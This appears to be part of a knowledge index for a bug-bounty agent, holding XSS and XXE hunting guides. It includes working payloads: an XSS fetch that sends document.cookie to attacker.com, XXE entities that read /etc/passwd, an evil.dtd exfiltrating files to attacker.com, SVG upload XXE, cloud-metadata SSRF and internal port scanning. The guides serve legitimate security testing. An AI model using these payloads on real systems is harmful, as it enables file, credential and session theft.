+    "text": "# XSS — Hunting Methodology\n\n## Types to Hunt\n\n| Type | Description | Priority |\n|---|---|---|\n| Stored XSS | Payload persists and executes for other users | Critical/High |\n| Reflected XSS | Payload reflects in response from URL/form input | High/Medium |\n| DOM-based XSS | Payload flows from DOM source to DOM sink in JS | High/Medium |\n\n## Required for Reportability\n\n- Payload executes JS in a real browser context (not just reflects as text)\n- Victim exists beyond the attacker (stored → any user; reflected → any user who clicks link)\n- Self-XSS (only affects attacker's own session) → NOT reportable\n\n## Common Sinks — Where XSS Executes\n\n**JavaScript sinks (highest risk):**\n- `innerHTML`, `outerHTML`, `insertAdjacentHTML`\n- `document.write()`, `document.writeln()`\n- `eval()`, `setTimeout(string)`, `setInterval(string)`, `Function(string)`\n- `location.href`, `location.replace()`, `window.open(url)`\n- `.src`, `.href` on script/link/iframe elements\n\n**Template sinks:**\n- Server-side templ",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\xss.md",
+        "mtime": 1775393895.2859168,
+        "size": 2888,
+        "hash": "265c9d5f1b223768fa08895841b3ef99caf23d2e76c47be31bdc3bc3bd27e628"
+      }
+    }
+  },
+  "6991923337579701793": {
+    "chunk_id": "rag\\vulnerabilities\\xss.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\xss.md",
+    "text": "pt/link/iframe elements\n\n**Template sinks:**\n- Server-side templates rendering unescaped user input: `{{ input | safe }}`, `{!! input !!}`, `<%= input %>`\n\n**Dom sources (attacker-controlled):**\n- `location.hash`, `location.search`, `location.href`\n- `document.referrer`, `document.URL`\n- `postMessage` data\n- `localStorage`, `sessionStorage` values set from external input\n\n## Encoding/Defense Bypass Confirmation Steps\n\n1. Confirm the framework does NOT auto-escape output in this context\n2. Confirm the output is inserted as HTML (not as text node or attribute with quotes)\n3. If HTML attribute: confirm quotes are not escaped → can break out with `\"`\n4. If JavaScript context: confirm backslash/quote not escaped → can inject with `';`\n5. If URL context: confirm `javascript:` is not blocked\n\nDo NOT report if:\n- React JSX renders the field (auto-escapes everything except `dangerouslySetInnerHTML`)\n- Django/Jinja2 renders without `| safe` (auto-escapes)\n- Output is in JSON body consumed by wel",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\xss.md",
+        "mtime": 1775393895.2859168,
+        "size": 2888,
+        "hash": "265c9d5f1b223768fa08895841b3ef99caf23d2e76c47be31bdc3bc3bd27e628"
+      }
+    }
+  },
+  "8136629834009011219": {
+    "chunk_id": "rag\\vulnerabilities\\xss.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\xss.md",
+    "text": "`| safe` (auto-escapes)\n- Output is in JSON body consumed by well-written JS (not innerHTML)\n- Angular's `{{ }}` interpolation (sanitized by default)\n\n## PoC Escalation Path\n\nFor reportability, prefer:\n1. `<script>alert(document.cookie)</script>` → proves cookie access\n2. `<img src=x onerror=alert(document.domain)>` → proves execution context\n3. `fetch('https://attacker.com?c='+document.cookie)` → proves exfiltration\n\nFor DOM XSS, trace source → sink explicitly and provide the JS code path.\n\n## Impact by Context\n\n| XSS Location | Impact |\n|---|---|\n| Auth'd area, persisted | ATO: steal session token, 2FA bypass |\n| Auth'd area, reflected | ATO with victim clicking attacker link |\n| Admin panel | Admin account compromise, lateral movement |\n| Payment page | Credit card skimming (if Magecart-style) |\n| Profile/bio | Worm potential if viewed by many users |\n| Email template | Usually lower (email client rendering) |\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\xss.md",
+        "mtime": 1775393895.2859168,
+        "size": 2888,
+        "hash": "265c9d5f1b223768fa08895841b3ef99caf23d2e76c47be31bdc3bc3bd27e628"
+      }
+    }
+  },
+  "5875841950998799060": {
+    "chunk_id": "rag\\vulnerabilities\\xxe.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\xxe.md",
+    "text": "# XXE — XML External Entity Injection Hunting Methodology\n\n## What Is XXE\n\nWhen an XML parser processes external entity references in user-supplied XML, an attacker can:\n- Read local files from the server filesystem\n- Perform SSRF via the parser\n- In some cases achieve RCE (via Expect wrapper or out-of-band techniques)\n\n---\n\n## Finding XXE Entry Points\n\n**Anywhere the application accepts XML input:**\n- SOAP web services (`Content-Type: text/xml`)\n- REST endpoints accepting `application/xml`\n- File upload (`.xml`, `.svg`, `.docx`, `.xlsx`, `.pptx` — all contain XML)\n- XML-based APIs (RSS feeds, Atom, sitemaps)\n- `Content-Type: application/x-www-form-urlencoded` endpoints that switch to XML parsing when XML is detected\n\n**Indicators the app parses XML:**\n- Request/response has XML structure\n- Errors mention \"XML\", \"SAX\", \"DOM\", \"XSD\", \"DTD\"\n- SOAP envelope visible in Burp\n- App accepts `.xml` file uploads\n\n---\n\n## Detection Payloads\n\n**Step 1 — Inject a basic XXE (suggest to user):**\n\nRe",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\xxe.md",
+        "mtime": 1775393895.2869244,
+        "size": 4302,
+        "hash": "cc99c471da134c652c58ccfa998dc2bd6ee0adf96b768421a81139f1556e8d6e"
+      }
+    }
+  },
+  "2974967356607473237": {
+    "chunk_id": "rag\\vulnerabilities\\xxe.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\xxe.md",
+    "text": "Payloads\n\n**Step 1 — Inject a basic XXE (suggest to user):**\n\nReplace the XML body with:\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root><data>&xxe;</data></root>\n```\n\nIf content of `/etc/passwd` appears in response → **Classic XXE confirmed.**\n\n**Step 2 — If no reflection (Blind XXE via OOB):**\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR-ID.oast.pro/xxe\"> %xxe;]>\n<root><data>test</data></root>\n```\n\nIf DNS/HTTP hit on collaborator → **Blind XXE confirmed.**\n\n**Step 3 — Blind XXE file exfiltration via DTD:**\nHost a malicious DTD at `http://attacker.com/evil.dtd`:\n```xml\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>\">\n%eval;\n%exfil;\n```\n\nThen inject: `<!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]>`\n\n---\n\n## SVG / File Upload XXE\n\nMany apps don't think of SVGs a",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\xxe.md",
+        "mtime": 1775393895.2869244,
+        "size": 4302,
+        "hash": "cc99c471da134c652c58ccfa998dc2bd6ee0adf96b768421a81139f1556e8d6e"
+      }
+    }
+  },
+  "4997983989506182976": {
+    "chunk_id": "rag\\vulnerabilities\\xxe.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\xxe.md",
+    "text": "\n\n---\n\n## SVG / File Upload XXE\n\nMany apps don't think of SVGs as XML:\n\n```xml\n<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<svg width=\"400px\" height=\"400px\" xmlns=\"http://www.w3.org/2000/svg\">\n  <text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text>\n</svg>\n```\n\nUpload as `.svg` to avatar, image, import features. If the server renders SVG and returns content → XXE via file upload.\n\n**Office documents (DOCX/XLSX):**\n- Unzip the DOCX\n- Inject XXE into `word/document.xml` or `[Content_Types].xml`\n- Re-zip and upload\n\n---\n\n## XXE → SSRF\n\nXXE can be used to reach internal services (like SSRF via XML parser):\n```xml\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://[cloud-imds-ip]/latest/meta-data/\">]>\n<root><data>&xxe;</data></root>\n```\n\nIf the response contains AWS IMDS data → **XXE → SSRF → Cloud credential theft = Critical.**\n\n---\n\n## XXE SSRF Internal Port Scan (Blind)\n\nTry internal addresses:\n```xml\n<!ENTITY xxe SYSTEM \"http://localhost:6379/\">   <",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\xxe.md",
+        "mtime": 1775393895.2869244,
+        "size": 4302,
+        "hash": "cc99c471da134c652c58ccfa998dc2bd6ee0adf96b768421a81139f1556e8d6e"
+      }
+    }
+  },
+  "4786523608048207254": {
+    "chunk_id": "rag\\vulnerabilities\\xxe.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\xxe.md",
+    "text": "resses:\n```xml\n<!ENTITY xxe SYSTEM \"http://localhost:6379/\">   <!-- Redis -->\n<!ENTITY xxe SYSTEM \"http://localhost:27017/\">  <!-- MongoDB -->\n<!ENTITY xxe SYSTEM \"http://localhost:8500/\">   <!-- Consul -->\n```\n\nObserve response time differences (open vs closed port) for internal port scanning.\n\n---\n\n## Defenses That Block XXE\n\n| Defense | Effect |\n|---|---|\n| `.disableExternalEntities()` in Java | Blocks external entity resolution |\n| `libxml_disable_entity_loader(true)` in PHP | Blocks in older PHP |\n| `FEATURE_EXTERNAL_GENERAL_ENTITIES = false` | Java SAX/DOM protection |\n| `defusedxml` library in Python | Blocks all XXE |\n| Whitelisting allowed XML structure | May not fully protect |\n\nIf the app uses these, XXE is blocked → discard.\n\n---\n\n## Impact Classification\n\n| Finding | Severity |\n|---|---|\n| File read: `/etc/passwd` | Medium |\n| File read: config/credentials/`.env` | High |\n| File read: `/etc/shadow`, SSH keys | Critical |\n| XXE → SSRF → cloud credentials | Critical |\n| Blin",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\xxe.md",
+        "mtime": 1775393895.2869244,
+        "size": 4302,
+        "hash": "cc99c471da134c652c58ccfa998dc2bd6ee0adf96b768421a81139f1556e8d6e"
+      }
+    }
+  },
+  "1237952256699226174": {
+    "chunk_id": "rag\\vulnerabilities\\xxe.md::chunk::4",
+    "doc_id": "rag\\vulnerabilities\\xxe.md",
+    "text": " Critical |\n| XXE → SSRF → cloud credentials | Critical |\n| Blind XXE (OOB confirmed, no data exfil) | Medium |\n| XXE in admin-only feature | Medium-High |\n\n## Evidence Requirements\n1. XML payload sent (full HTTP request)\n2. File content returned in response (or OOB DNS/HTTP request received)\n3. Exact XML feature/endpoint affected\n4. If blind: collaborator log showing DNS/HTTP callback\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 4,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\xxe.md",
+        "mtime": 1775393895.2869244,
+        "size": 4302,
+        "hash": "cc99c471da134c652c58ccfa998dc2bd6ee0adf96b768421a81139f1556e8d6e"
+      }
+    }
+  }
+}
